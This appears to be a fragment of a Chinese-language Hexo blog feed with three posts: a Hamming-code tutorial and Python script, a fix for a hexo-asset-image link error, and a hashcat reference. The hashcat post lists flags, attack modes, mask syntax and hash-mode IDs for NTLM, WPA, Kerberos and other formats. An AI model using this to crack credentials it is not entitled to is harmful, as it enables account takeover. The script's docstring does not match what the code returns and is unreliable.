<tr class="even">
<td>H8</td>
<td>9，10，11，12</td>
<td><span class="math inline">\(0\oplus1\oplus1\oplus0\)</span></td>
<td>0</td>
</tr>
</tbody>
</table>
<blockquote>
<p>即对应信息位的偶校验码——保持为偶数个1（包括自身）</p>
</blockquote>
<p>最终得到的信息为：</p>
<table style="width:100%;">
<colgroup>
<col style="width: 7%">
<col style="width: 7%">
<col style="width: 7%">
<col style="width: 7%">
<col style="width: 7%">
<col style="width: 8%">
<col style="width: 7%">
<col style="width: 7%">
<col style="width: 7%">
<col style="width: 8%">
<col style="width: 7%">
<col style="width: 8%">
<col style="width: 8%">
</colgroup>
<thead>
<tr class="header">
<th>位置</th>
<th>12</th>
<th>11</th>
<th>10</th>
<th>9</th>
<th>8</th>
<th>7</th>
<th>6</th>
<th>5</th>
<th>4</th>
<th>3</th>
<th>2</th>
<th>1</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>信息</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>0</td>
<td><strong>0</strong></td>
<td>1</td>
<td>1</td>
<td>1</td>
<td><strong>1</strong></td>
<td>0</td>
<td><strong>0</strong></td>
<td><strong>1</strong></td>
</tr>
</tbody>
</table>
<p>其中海明校验码为 H8H4H2H1 = <strong>0101</strong></p>
<h2 id="校验和纠错">校验和纠错</h2>
<p>假设信息 0110 0111 1001 被错误传输为 011<strong>1</strong> 0111
1001</p>
<p>我们对信息重新算出校验码 H8H4H2H1 = <strong>1100</strong></p>
<p>而我们可以从信息中提取出原校验码为 <strong>0101</strong></p>
<p>我们对其进行异或得到 <span class="math inline">\(0101\oplus1100=1001\)</span>，即第
<strong>9</strong> 位出错</p>
<h2 id="脚本">脚本</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">createHamming</span>(<span class="params">data: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    对原数据加入海明校验码，并返回 Hamming 对象</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; h = h = createHamming(&#x27;01101110&#x27;)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; h.msg(), h.code()</span></span><br><span class="line"><span class="string">    (&#x27;01101110&#x27;, &#x27;0101&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    `Parameters`:</span></span><br><span class="line"><span class="string">        data - 原数据</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    `Returns`:</span></span><br><span class="line"><span class="string">        Hamming 对象</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    k = <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> itertools.count():</span><br><span class="line">        <span class="keyword">if</span> k + r &lt;= (<span class="number">1</span> &lt;&lt; r) - <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    itdata = <span class="built_in">iter</span>(data[::-<span class="number">1</span>])</span><br><span class="line">    newdata = [<span class="built_in">int</span>(<span class="built_in">next</span>(itdata)) <span class="keyword">if</span> (i &amp; (i - <span class="number">1</span>)) <span class="keyword">else</span> <span class="literal">None</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, k + r + <span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(newdata):</span><br><span class="line">        <span class="keyword">if</span> v <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            t = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, <span class="built_in">len</span>(newdata)):</span><br><span class="line">                <span class="keyword">if</span> newdata[j] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> ((j + <span class="number">1</span>) &amp; (i + <span class="number">1</span>)):</span><br><span class="line">                    t ^= newdata[j]</span><br><span class="line">            newdata[i] = t</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, newdata[::-<span class="number">1</span>]))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo-asset-image: update link as:--&gt;/.io//xxx.png</title>
    <url>//errors/hexo-image-link-error.html</url>
    <content><![CDATA[<h1 id="错误分析">错误分析</h1>
<p>hexo-asset-image 无法识别 hexo 默认的永久链接
(<code>permalink</code>) 时，导致无法自动生成静态资源文件夹路径</p>
<figure>
<img src="/errors/hexo-image-link-error/update-link-error.png" alt="update-link-error">
<figcaption aria-hidden="true">update-link-error</figcaption>
</figure>
<h1 id="修复错误">修复错误</h1>
<p>有以下两种解决方案：</p>
<ol type="1">
<li>修改 hexo 的站点配置文件</li>
<li>为每篇文章手动配置 <code>permalink</code></li>
</ol>
<blockquote>
<p>建议两者一起使用</p>
</blockquote>
<h2 id="修改-hexo-的站点配置文件">修改 hexo 的站点配置文件</h2>
<p>将 <code>URL</code> 配置中的 <code>permalink</code>
参数置空或改为英文文件夹名 (详细配置请参考<a href="/hexo-note.html#网址-URL">网址-URL</a>)</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">permalink:</span> </span><br></pre></td></tr></table></figure>
<blockquote>
<p>推荐使用 permalink: :title.html</p>
</blockquote>
<h2 id="为每篇文章手动配置-permalink">为每篇文章手动配置
<code>permalink</code></h2>
<p>在你的博文的 <code>Front-matter</code> 中添加 <code>permalink</code>
参数 (详细配置请参考<a href="/hexo-note.html#hexo%20博文头%20-%20Front-matter">Front-matter</a>)</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">permalink:</span> <span class="string">/project/index.html</span></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>error</tag>
        <tag>hexo</tag>
        <tag>hexo-asset-image</tag>
      </tags>
  </entry>
  <entry>
    <title>hashcat 使用笔记</title>
    <url>//hashcat-note.html</url>
    <content><![CDATA[<h1 id="hashcat-简述">Hashcat 简述</h1>
<p>Hashcat 是自称世界上最快的密码恢复工具。</p>
<p>在 Debian 系的 Linux 中可以使用 <code>apt install hashcat</code>
获取。</p>
<p>也可以在 github 官方页面中获取更多信息：<a href="https://github.com/hashcat/hashcat">https://github.com/hashcat/hashcat</a></p>
<p>支持 hashcat 的散列算法有 Microsoft LM 哈希，MD4，MD5，SHA系列，Unix
加密格式，MySQL 和 Cisco PIX 等。</p>
<p>同时也支持多种计算核心：GPU、CPU、APU、DSP、FPGA、Coprocessor</p>
<h1 id="常用参数">常用参数</h1>
<table>
<thead>
<tr class="header">
<th>参数</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>-m</td>
<td>指定哈希类型，不指定默认为 md5</td>
</tr>
<tr class="even">
<td>-a</td>
<td>指定破解模式</td>
</tr>
<tr class="odd">
<td>-V</td>
<td>查看版本信息</td>
</tr>
<tr class="even">
<td>-o</td>
<td>将输出结果储存到指定文件</td>
</tr>
<tr class="odd">
<td>--force</td>
<td>忽略警告</td>
</tr>
<tr class="even">
<td>--show</td>
<td>仅显示破解的hash密码和对应的明文</td>
</tr>
<tr class="odd">
<td>--remove</td>
<td>从源文件中删除破解成功的hash</td>
</tr>
<tr class="even">
<td>--username</td>
<td>忽略hash表中的用户名</td>
</tr>
<tr class="odd">
<td>-b</td>
<td>测试计算机破解速度和相关硬件信息</td>
</tr>
<tr class="even">
<td>-O</td>
<td>限制密码长度</td>
</tr>
<tr class="odd">
<td>-T</td>
<td>设置线程数</td>
</tr>
<tr class="even">
<td>-r</td>
<td>使用规则文件</td>
</tr>
<tr class="odd">
<td>-1 / -2 / -3</td>
<td>自定义字符集</td>
</tr>
<tr class="even">
<td>-i</td>
<td>启用增量破解模式</td>
</tr>
<tr class="odd">
<td>--increment-min</td>
<td>设置密码最小长度</td>
</tr>
<tr class="even">
<td>--increment-max</td>
<td>设置密码最大长度</td>
</tr>
</tbody>
</table>
<h2 id="a-破解模式">-a 破解模式</h2>
<table>
<thead>
<tr class="header">
<th>-a 参数</th>
<th>攻击模式</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>0</td>
<td>Straight（字段破解）</td>
</tr>
<tr class="even">
<td>1</td>
<td>Combination（组合破解）</td>
</tr>
<tr class="odd">
<td>3</td>
<td>Brute-force（掩码暴力破解）</td>
</tr>
<tr class="even">
<td>6</td>
<td>Hybrid Wordlist + Mask（字典+掩码破解）</td>
</tr>
<tr class="odd">
<td>7</td>
<td>Hybrid Mask + Wordlist（掩码+字典破解）</td>
</tr>
</tbody>
</table>
<h2 id="掩码字符集">掩码字符集</h2>
<table>
<thead>
<tr class="header">
<th>掩码字符集</th>
<th>指代</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>?l</td>
<td>代表小写字母</td>
</tr>
<tr class="even">
<td>?u</td>
<td>代表大写字母</td>
</tr>
<tr class="odd">
<td>?d</td>
<td>代表数字</td>
</tr>
<tr class="even">
<td>?h</td>
<td>常见小写字母和数字</td>
</tr>
<tr class="odd">
<td>?H</td>
<td>常见大写字母和数字</td>
</tr>
<tr class="even">
<td>?s</td>
<td>代表特殊字符</td>
</tr>
<tr class="odd">
<td>?a</td>
<td>代表大小写字母、数字以及特殊字符</td>
</tr>
<tr class="even">
<td>?b</td>
<td>0x00-0xff</td>
</tr>
</tbody>
</table>
<blockquote>
<p>同时支持自定义字符集，即</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -1 abc123 ?1?1?1</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="hash-id-对照表">hash id 对照表</h2>
<table>
<colgroup>
<col style="width: 7%">
<col style="width: 53%">
<col style="width: 39%">
</colgroup>
<thead>
<tr class="header">
<th>-m 参数</th>
<th>Name</th>
<th>Category</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>900</td>
<td><code>MD4</code></td>
<td>Raw Hash</td>
</tr>
<tr class="even">
<td>0</td>
<td><code>MD5</code></td>
<td>Raw Hash</td>
</tr>
<tr class="odd">
<td>5100</td>
<td><code>Half MD5</code></td>
<td>Raw Hash</td>
</tr>
<tr class="even">
<td>100</td>
<td><code>SHA1</code></td>
<td>Raw Hash</td>
</tr>
<tr class="odd">
<td>1300</td>
<td><code>SHA2-224</code></td>
<td>Raw Hash</td>
</tr>
<tr class="even">
<td>1400</td>
<td><code>SHA2-256</code></td>
<td>Raw Hash</td>
</tr>
<tr class="odd">
<td>10800</td>
<td><code>SHA2-384</code></td>
<td>Raw Hash</td>
</tr>
<tr class="even">
<td>1700</td>
<td><code>SHA2-512</code></td>
<td>Raw Hash</td>
</tr>
<tr class="odd">
<td>17300</td>
<td><code>SHA3-224</code></td>
<td>Raw Hash</td>
</tr>
<tr class="even">
<td>17400</td>
<td><code>SHA3-256</code></td>
<td>Raw Hash</td>
</tr>
<tr class="odd">
<td>17500</td>
<td><code>SHA3-384</code></td>
<td>Raw Hash</td>
</tr>
<tr class="even">
<td>17600</td>
<td><code>SHA3-512</code></td>
<td>Raw Hash</td>
</tr>
<tr class="odd">
<td>17700</td>
<td><code>Keccak-224</code></td>
<td>Raw Hash</td>
</tr>
<tr class="even">
<td>17800</td>
<td><code>Keccak-256</code></td>
<td>Raw Hash</td>
</tr>
<tr class="odd">
<td>17900</td>
<td><code>Keccak-384</code></td>
<td>Raw Hash</td>
</tr>
<tr class="even">
<td>18000</td>
<td><code>Keccak-512</code></td>
<td>Raw Hash</td>
</tr>
<tr class="odd">
<td>600</td>
<td><code>BLAKE2b-512</code></td>
<td>Raw Hash</td>
</tr>
<tr class="even">
<td>10100</td>
<td><code>SipHash</code></td>
<td>Raw Hash</td>
</tr>
<tr class="odd">
<td>6000</td>
<td><code>RIPEMD-160</code></td>
<td>Raw Hash</td>
</tr>
<tr class="even">
<td>6100</td>
<td><code>Whirlpool</code></td>
<td>Raw Hash</td>
</tr>
<tr class="odd">
<td>6900</td>
<td><code>GOST R 34.11-94</code></td>
<td>Raw Hash</td>
</tr>
<tr class="even">
<td>11700</td>
<td><code>GOST R 34.11-2012 (Streebog) 256-bit, big-endian</code></td>
<td>Raw Hash</td>
</tr>
<tr class="odd">
<td>11800</td>
<td><code>GOST R 34.11-2012 (Streebog) 512-bit, big-endian</code></td>
<td>Raw Hash</td>
</tr>
<tr class="even">
<td>10</td>
<td><code>md5($pass.$salt)</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="odd">
<td>20</td>
<td><code>md5($salt.$pass)</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="even">
<td>30</td>
<td><code>md5(utf16le($pass).$salt)</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="odd">
<td>40</td>
<td><code>md5($salt.utf16le($pass))</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="even">
<td>3800</td>
<td><code>md5($salt.$pass.$salt)</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="odd">
<td>3710</td>
<td><code>md5($salt.md5($pass))</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="even">
<td>4010</td>
<td><code>md5($salt.md5($salt.$pass))</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="odd">
<td>4110</td>
<td><code>md5($salt.md5($pass.$salt))</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="even">
<td>2600</td>
<td><code>md5(md5($pass))</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="odd">
<td>3910</td>
<td><code>md5(md5($pass).md5($salt))</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="even">
<td>4300</td>
<td><code>md5(strtoupper(md5($pass)))</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="odd">
<td>4400</td>
<td><code>md5(sha1($pass))</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="even">
<td>110</td>
<td><code>sha1($pass.$salt)</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="odd">
<td>120</td>
<td><code>sha1($salt.$pass)</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="even">
<td>130</td>
<td><code>sha1(utf16le($pass).$salt)</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="odd">
<td>140</td>
<td><code>sha1($salt.utf16le($pass))</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="even">
<td>4500</td>
<td><code>sha1(sha1($pass))</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="odd">
<td>4520</td>
<td><code>sha1($salt.sha1($pass))</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="even">
<td>4700</td>
<td><code>sha1(md5($pass))</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="odd">
<td>4900</td>
<td><code>sha1($salt.$pass.$salt)</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="even">
<td>14400</td>
<td><code>sha1(CX)</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="odd">
<td>1410</td>
<td><code>sha256($pass.$salt)</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="even">
<td>1420</td>
<td><code>sha256($salt.$pass)</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="odd">
<td>1430</td>
<td><code>sha256(utf16le($pass).$salt)</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="even">
<td>1440</td>
<td><code>sha256($salt.utf16le($pass))</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="odd">
<td>1710</td>
<td><code>sha512($pass.$salt)</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="even">
<td>1720</td>
<td><code>sha512($salt.$pass)</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="odd">
<td>1730</td>
<td><code>sha512(utf16le($pass).$salt)</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="even">
<td>1740</td>
<td><code>sha512($salt.utf16le($pass))</code></td>
<td>Raw Hash, Salted and/or Iterated</td>
</tr>
<tr class="odd">
<td>50</td>
<td><code>HMAC-MD5 (key = $pass)</code></td>
<td>Raw Hash, Authenticated</td>
</tr>
<tr class="even">
<td>60</td>
<td><code>HMAC-MD5 (key = $salt)</code></td>
<td>Raw Hash, Authenticated</td>
</tr>
<tr class="odd">
<td>150</td>
<td><code>HMAC-SHA1 (key = $pass)</code></td>
<td>Raw Hash, Authenticated</td>
</tr>
<tr class="even">
<td>160</td>
<td><code>HMAC-SHA1 (key = $salt)</code></td>
<td>Raw Hash, Authenticated</td>
</tr>
<tr class="odd">
<td>1450</td>
<td><code>HMAC-SHA256 (key = $pass)</code></td>
<td>Raw Hash, Authenticated</td>
</tr>
<tr class="even">
<td>1460</td>
<td><code>HMAC-SHA256 (key = $salt)</code></td>
<td>Raw Hash, Authenticated</td>
</tr>
<tr class="odd">
<td>1750</td>
<td><code>HMAC-SHA512 (key = $pass)</code></td>
<td>Raw Hash, Authenticated</td>
</tr>
<tr class="even">
<td>1760</td>
<td><code>HMAC-SHA512 (key = $salt)</code></td>
<td>Raw Hash, Authenticated</td>
</tr>
<tr class="odd">
<td>11750</td>
<td><code>HMAC-Streebog-256 (key = $pass), big-endian</code></td>
<td>Raw Hash, Authenticated</td>
</tr>
<tr class="even">
<td>11760</td>
<td><code>HMAC-Streebog-256 (key = $salt), big-endian</code></td>
<td>Raw Hash, Authenticated</td>
</tr>
<tr class="odd">
<td>11850</td>
<td><code>HMAC-Streebog-512 (key = $pass), big-endian</code></td>
<td>Raw Hash, Authenticated</td>
</tr>
<tr class="even">
<td>11860</td>
<td><code>HMAC-Streebog-512 (key = $salt), big-endian</code></td>
<td>Raw Hash, Authenticated</td>
</tr>
<tr class="odd">
<td>14000</td>
<td><code>DES (PT = $salt, key = $pass)</code></td>
<td>Raw Cipher, Known-Plaintext attack</td>
</tr>
<tr class="even">
<td>14100</td>
<td><code>3DES (PT = $salt, key = $pass)</code></td>
<td>Raw Cipher, Known-Plaintext attack</td>
</tr>
<tr class="odd">
<td>14900</td>
<td><code>Skip32 (PT = $salt, key = $pass)</code></td>
<td>Raw Cipher, Known-Plaintext attack</td>
</tr>
<tr class="even">
<td>15400</td>
<td><code>ChaCha20</code></td>
<td>Raw Cipher, Known-Plaintext attack</td>
</tr>
<tr class="odd">
<td>400</td>
<td><code>phpass</code></td>
<td>Generic KDF</td>
</tr>
<tr class="even">
<td>8900</td>
<td><code>scrypt</code></td>
<td>Generic KDF</td>
</tr>
<tr class="odd">
<td>11900</td>
<td><code>PBKDF2-HMAC-MD5</code></td>
<td>Generic KDF</td>
</tr>
<tr class="even">
<td>12000</td>
<td><code>PBKDF2-HMAC-SHA1</code></td>
<td>Generic KDF</td>
</tr>
<tr class="odd">
<td>10900</td>
<td><code>PBKDF2-HMAC-SHA256</code></td>
<td>Generic KDF</td>
</tr>
<tr class="even">
<td>12100</td>
<td><code>PBKDF2-HMAC-SHA512</code></td>
<td>Generic KDF</td>
</tr>
<tr class="odd">
<td>23</td>
<td><code>Skype</code></td>
<td>Network Protocols</td>
</tr>
<tr class="even">
<td>2500</td>
<td><code>WPA-EAPOL-PBKDF2</code></td>
<td>Network Protocols</td>
</tr>
<tr class="odd">
<td>2501</td>
<td><code>WPA-EAPOL-PMK</code></td>
<td>Network Protocols</td>
</tr>
<tr class="even">
<td>16800</td>
<td><code>WPA-PMKID-PBKDF2</code></td>
<td>Network Protocols</td>
</tr>
<tr class="odd">
<td>16801</td>
<td><code>WPA-PMKID-PMK</code></td>
<td>Network Protocols</td>
</tr>
<tr class="even">
<td>4800</td>
<td><code>iSCSI CHAP authentication, MD5(CHAP)</code></td>
<td>Network Protocols</td>
</tr>
<tr class="odd">
<td>5300</td>
<td><code>IKE-PSK MD5</code></td>
<td>Network Protocols</td>
</tr>
<tr class="even">
<td>5400</td>
<td><code>IKE-PSK SHA1</code></td>
<td>Network Protocols</td>
</tr>
<tr class="odd">
<td>5500</td>
<td><code>NetNTLMv1</code></td>
<td>Network Protocols</td>
</tr>
<tr class="even">
<td>5500</td>
<td><code>NetNTLMv1+ESS</code></td>
<td>Network Protocols</td>
</tr>
<tr class="odd">
<td>5600</td>
<td><code>NetNTLMv2</code></td>
<td>Network Protocols</td>
</tr>
<tr class="even">
<td>7300</td>
<td><code>IPMI2 RAKP HMAC-SHA1</code></td>
<td>Network Protocols</td>
</tr>
<tr class="odd">
<td>7500</td>
<td><code>Kerberos 5 AS-REQ Pre-Auth etype 23</code></td>
<td>Network Protocols</td>
</tr>
<tr class="even">
<td>8300</td>
<td><code>DNSSEC (NSEC3)</code></td>
<td>Network Protocols</td>
</tr>
<tr class="odd">
<td>10200</td>
<td><code>CRAM-MD5</code></td>
<td>Network Protocols</td>
</tr>
<tr class="even">
<td>11100</td>
<td><code>PostgreSQL CRAM (MD5)</code></td>
<td>Network Protocols</td>
</tr>
<tr class="odd">
<td>11200</td>
<td><code>MySQL CRAM (SHA1)</code></td>
<td>Network Protocols</td>
</tr>
<tr class="even">
<td>11400</td>
<td><code>SIP digest authentication (MD5)</code></td>
<td>Network Protocols</td>
</tr>
<tr class="odd">
<td>13100</td>
<td><code>Kerberos 5 TGS-REP etype 23</code></td>
<td>Network Protocols</td>
</tr>
<tr class="even">
<td>16100</td>
<td><code>TACACS+</code></td>
<td>Network Protocols</td>
</tr>
<tr class="odd">
<td>16500</td>
<td><code>JWT (JSON Web Token)</code></td>
<td>Network Protocols</td>
</tr>
<tr class="even">
<td>18200</td>
<td><code>Kerberos 5 AS-REP etype 23</code></td>
<td>Network Protocols</td>
</tr>
<tr class="odd">
<td>121</td>
<td><code>SMF (Simple Machines Forum) &gt; v1.1</code></td>
<td>Forums, CMS, E-Commerce, Frameworks</td>
</tr>
<tr class="even">
<td>400</td>
<td><code>phpBB3 (MD5)</code></td>
<td>Forums, CMS, E-Commerce, Frameworks</td>
</tr>
<tr class="odd">
<td>2611</td>
<td><code>vBulletin &lt; v3.8.5</code></td>
<td>Forums, CMS, E-Commerce, Frameworks</td>
</tr>
<tr class="even">
<td>2711</td>
<td><code>vBulletin &gt;= v3.8.5</code></td>
<td>Forums, CMS, E-Commerce, Frameworks</td>
</tr>
<tr class="odd">
<td>2811</td>
<td><code>MyBB 1.2+</code></td>
<td>Forums, CMS, E-Commerce, Frameworks</td>
</tr>
<tr class="even">
<td>2811</td>
<td><code>IPB2+ (Invision Power Board)</code></td>
<td>Forums, CMS, E-Commerce, Frameworks</td>
</tr>
<tr class="odd">
<td>8400</td>
<td><code>WBB3 (Woltlab Burning Board)</code></td>
<td>Forums, CMS, E-Commerce, Frameworks</td>
</tr>
<tr class="even">
<td>11</td>
<td><code>Joomla &lt; 2.5.18</code></td>
<td>Forums, CMS, E-Commerce, Frameworks</td>
</tr>
<tr class="odd">
<td>400</td>
<td><code>Joomla &gt;= 2.5.18 (MD5)</code></td>
<td>Forums, CMS, E-Commerce, Frameworks</td>
</tr>
<tr class="even">
<td>400</td>
<td><code>WordPress (MD5)</code></td>
<td>Forums, CMS, E-Commerce, Frameworks</td>
</tr>
<tr class="odd">
<td>2612</td>
<td><code>PHPS</code></td>
<td>Forums, CMS, E-Commerce, Frameworks</td>
</tr>
<tr class="even">
<td>7900</td>
<td><code>Drupal7</code></td>
<td>Forums, CMS, E-Commerce, Frameworks</td>
</tr>
<tr class="odd">
<td>21</td>
<td><code>osCommerce</code></td>
<td>Forums, CMS, E-Commerce, Frameworks</td>
</tr>
<tr class="even">
<td>21</td>
<td><code>xt:Commerce</code></td>
<td>Forums, CMS, E-Commerce, Frameworks</td>
</tr>
<tr class="odd">
<td>11000</td>
<td><code>PrestaShop</code></td>
<td>Forums, CMS, E-Commerce, Frameworks</td>
</tr>
<tr class="even">
<td>124</td>
<td><code>Django (SHA-1)</code></td>
<td>Forums, CMS, E-Commerce, Frameworks</td>
</tr>
<tr class="odd">
<td>10000</td>
<td><code>Django (PBKDF2-SHA256)</code></td>
<td>Forums, CMS, E-Commerce, Frameworks</td>
</tr>
<tr class="even">
<td>16000</td>
<td><code>Tripcode</code></td>
<td>Forums, CMS, E-Commerce, Frameworks</td>
</tr>
<tr class="odd">
<td>3711</td>
<td><code>MediaWiki B type</code></td>
<td>Forums, CMS, E-Commerce, Frameworks</td>
</tr>
<tr class="even">
<td>13900</td>
<td><code>OpenCart</code></td>
<td>Forums, CMS, E-Commerce, Frameworks</td>
</tr>
<tr class="odd">
<td>4521</td>
<td><code>Redmine</code></td>
<td>Forums, CMS, E-Commerce, Frameworks</td>
</tr>
<tr class="even">
<td>4522</td>
<td><code>PunBB</code></td>
<td>Forums, CMS, E-Commerce, Frameworks</td>
</tr>
<tr class="odd">
<td>12001</td>
<td><code>Atlassian (PBKDF2-HMAC-SHA1)</code></td>
<td>Forums, CMS, E-Commerce, Frameworks</td>
</tr>
<tr class="even">
<td>12</td>
<td><code>PostgreSQL</code></td>
<td>Database Server</td>
</tr>
<tr class="odd">
<td>131</td>
<td><code>MSSQL (2000)</code></td>
<td>Database Server</td>
</tr>
<tr class="even">
<td>132</td>
<td><code>MSSQL (2005)</code></td>
<td>Database Server</td>
</tr>
<tr class="odd">
<td>1731</td>
<td><code>MSSQL (2012, 2014)</code></td>
<td>Database Server</td>
</tr>
<tr class="even">
<td>200</td>
<td><code>MySQL323</code></td>
<td>Database Server</td>
</tr>
<tr class="odd">
<td>300</td>
<td><code>MySQL4.1/MySQL5</code></td>
<td>Database Server</td>
</tr>
<tr class="even">
<td>3100</td>
<td><code>Oracle H: Type (Oracle 7+)</code></td>
<td>Database Server</td>
</tr>
<tr class="odd">
<td>112</td>
<td><code>Oracle S: Type (Oracle 11+)</code></td>
<td>Database Server</td>
</tr>
<tr class="even">
<td>12300</td>
<td><code>Oracle T: Type (Oracle 12+)</code></td>
<td>Database Server</td>
</tr>
<tr class="odd">
<td>8000</td>
<td><code>Sybase ASE</code></td>
<td>Database Server</td>
</tr>
<tr class="even">
<td>141</td>
<td><code>Episerver 6.x &lt; .NET 4</code></td>
<td>HTTP, SMTP, LDAP Server</td>
</tr>
<tr class="odd">
<td>1441</td>
<td><code>Episerver 6.x &gt;= .NET 4</code></td>
<td>HTTP, SMTP, LDAP Server</td>
</tr>
<tr class="even">
<td>1600</td>
<td><code>Apache $apr1$ MD5, md5apr1, MD5 (APR)</code></td>
<td>HTTP, SMTP, LDAP Server</td>
</tr>
<tr class="odd">
<td>12600</td>
<td><code>ColdFusion 10+</code></td>
<td>HTTP, SMTP, LDAP Server</td>
</tr>
<tr class="even">
<td>1421</td>
<td><code>hMailServer</code></td>
<td>HTTP, SMTP, LDAP Server</td>
</tr>
<tr class="odd">
<td>101</td>
<td><code>nsldap, SHA-1(Base64), Netscape LDAP SHA</code></td>
<td>HTTP, SMTP, LDAP Server</td>
</tr>
<tr class="even">
<td>111</td>
<td><code>nsldaps, SSHA-1(Base64), Netscape LDAP SSHA</code></td>
<td>HTTP, SMTP, LDAP Server</td>
</tr>
<tr class="odd">
<td>1411</td>
<td><code>SSHA-256(Base64), LDAP &#123;SSHA256&#125;</code></td>
<td>HTTP, SMTP, LDAP Server</td>
</tr>
<tr class="even">
<td>1711</td>
<td><code>SSHA-512(Base64), LDAP &#123;SSHA512&#125;</code></td>
<td>HTTP, SMTP, LDAP Server</td>
</tr>
<tr class="odd">
<td>16400</td>
<td><code>CRAM-MD5 Dovecot</code></td>
<td>HTTP, SMTP, LDAP Server</td>
</tr>
<tr class="even">
<td>15000</td>
<td><code>FileZilla Server &gt;= 0.9.55</code></td>
<td>FTP Server</td>
</tr>
<tr class="odd">
<td>11500</td>
<td><code>CRC32</code></td>
<td>Checksums</td>
</tr>
<tr class="even">
<td>3000</td>
<td><code>LM</code></td>
<td>Operating Systems</td>
</tr>
<tr class="odd">
<td>1000</td>
<td><code>NTLM</code></td>
<td>Operating Systems</td>
</tr>
<tr class="even">
<td>1100</td>
<td><code>Domain Cached Credentials (DCC), MS Cache</code></td>
<td>Operating Systems</td>
</tr>
<tr class="odd">
<td>2100</td>
<td><code>Domain Cached Credentials 2 (DCC2), MS Cache 2</code></td>
<td>Operating Systems</td>
</tr>
<tr class="even">
<td>15300</td>
<td><code>DPAPI masterkey file v1</code></td>
<td>Operating Systems</td>
</tr>
<tr class="odd">
<td>15900</td>
<td><code>DPAPI masterkey file v2</code></td>
<td>Operating Systems</td>
</tr>
<tr class="even">
<td>12800</td>
<td><code>MS-AzureSync  PBKDF2-HMAC-SHA256</code></td>
<td>Operating Systems</td>
</tr>
<tr class="odd">
<td>1500</td>
<td><code>descrypt, DES (Unix), Traditional DES</code></td>
<td>Operating Systems</td>
</tr>
<tr class="even">
<td>12400</td>
<td><code>BSDi Crypt, Extended DES</code></td>
<td>Operating Systems</td>
</tr>
<tr class="odd">
<td>500</td>
<td><code>md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)</code></td>
<td>Operating Systems</td>
</tr>
<tr class="even">
<td>3200</td>
<td><code>bcrypt $2*$, Blowfish (Unix)</code></td>
<td>Operating Systems</td>
</tr>
<tr class="odd">
<td>7400</td>
<td><code>sha256crypt $5$, SHA256 (Unix)</code></td>
<td>Operating Systems</td>
</tr>
